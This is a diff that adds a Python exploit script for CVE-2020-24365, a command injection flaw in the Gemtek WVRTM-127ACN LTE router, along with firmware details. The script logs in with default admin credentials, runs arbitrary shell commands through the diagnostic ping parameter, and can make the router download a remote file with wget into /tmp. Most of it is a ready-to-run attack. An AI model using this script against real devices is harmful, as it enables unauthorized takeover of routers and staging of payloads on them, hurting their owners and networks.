@@ -1,0 +1,120 @@
+# Exploit Title: Gemtek WVRTM-127ACN 01.01.02.141 - Authenticated Arbitrary Command Injection 
+# Date: 13/09/2020                                         
+# Exploit Author: Gabriele Zuddas                         
+# Version: 01.01.02.127, 01.01.02.141                      
+# CVE : CVE-2020-24365                                     
+
+
+Service Provider : 	Linkem
+Product Name : 	LTE CPE
+Model ID : 	WVRTM-127ACN
+Serial ID :	GMK170418011089
+IMEI : 	XXXXXXXXXXXXX
+ICCID : 	XXXXXXXXXXXXXXXXXX
+Firmware Version : 	01.01.02.141
+Firmware Creation Date : 	May 15 13:04:30 CST 2019
+Bootrom Version : 	U-Boot 1.1.3
+Bootrom Creation Date : 	Oct 23 2015 - 16:03:05
+LTE Support Band : 	42,43
+
+
+Injecting happens here:
+
+sh -c (ping -4 -c 1 -s 4 -W 1 "INJECTION" > /tmp/mon_diag.log 2>&1; cmscfg -s -n mon_diag_status -v 0)&
+
+
+Exploit has been tested on older verions too:
+    Firmware Version: 	01.01.02.127
+    Firmware Creation Date : 	May 23 15:34:10 CST 2018
+
+"""
+
+import requests, time, argparse, re, sys
+
+class Exploit():
+    
+    CVE = "CVE-2020-24365"
+    
+    def __init__(self, args):
+        self.args = args
+        self.session = requests.Session()
+    
+    def login(self):
+        s = self.session
+        r = s.post(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=login.asp&action=login", data={"user_name":self.args.username,"user_passwd":self.args.password})
+        if "sid" not in s.cookies:
+            print("[!] Login failed.")
+            exit(1)
+        sid = s.cookies["sid"]
+        s.headers = {"sid": sid}
+        print(f"[*] Login successful! (sid={sid})")
+    
+    def now(self):
+        return int(time.time() * 1000)
+
+    def exploit(self, command):
+        self.login()
+        
+        with self.session as s:
+            payload = f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&action=save_monitor_diagnostic&mon_diag_type=0&mon_diag_addr=$({command};)&mon_ping_num=1&mon_ping_size=4&mon_ping_timeout=1&mon_tracert_hops=&mon_diag_protocol_type=4&time={self.now()}&_={self.now()}"
+            
+            r = s.get(payload)
+            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&action=diagnostic_tools_start&notrun=1&time={self.now()}&_={self.now()}")
+            content = str(r.content, "utf8")
+
+            #Attempt to stop the command as some commands tend to get stuck (if commands stop working check on the web interface)
+            r = s.get(payload)
+            r = s.get(f"http://{self.args.target}/cgi-bin/sysconf.cgi?page=ajax.asp&action=diagnostic_tools_start&notrun=1&time={self.now()}&_={self.now()}")
+            content = str(r.content, "utf8")
+            
+            #TODO: eventually parse content with regex to clean out the output
+            c = re.findall(r"(?<=ping: bad address \')(.*)(?=\')", content)
+            print(content)
+            print(c[0])
+            
+            if len(c) > 0:
+                return c[0]
+            else:
+                return False
+
+    def download_file(self, url):
+        filename = url.rsplit('/', 1)[-1]
+        
+        if self.args.file is not None:
+            print(f"[*] Attempting download of file '{filename}' from {url} ...")
+    
+            if self.exploit(f"wget {url} -O /tmp/{filename}"):
+                print(f"[*] File saved on {self.args.target}'s /tmp/{filename}.")
+                print(self.exploit(f"du -h /tmp/{filename}"))
+                return True
+            else:
+                print(f"[!] Failed to download {filename} from {url}")
+                return False
+
+    def run(self):
+        if self.args.command is not None:
+            print(self.exploit(self.args.command))
+            exit()
+        if self.args.file is not None:
+            self.download_file(self.args.file)
+            exit()
+
+if __name__ == "__main__":
+    # Create the parser and add arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", default="192.168.1.1", help="Vulnerable target")
+    parser.add_argument("-u", "--username", dest="username", default="admin", help="Valid username to use")
+    parser.add_argument("-p", "--password", dest="password", default="admin", help="Valid password to use")
+    parser.add_argument("-c", "--command", dest="command", default=None, help="Command to execute")
+    
+    parser.add_argument("-D", "--download-file", dest="file", default=None, help="Download file on target's /tmp directory")
+
+    args = parser.parse_args()
+
+    # Run exploit
+    X = Exploit(args)
+    if len(sys.argv) > 1:
+        print(f"[*] Exploiting {X.CVE} ...")
+        X.run()
+    else:
+        parser.print_help(sys.stderr)
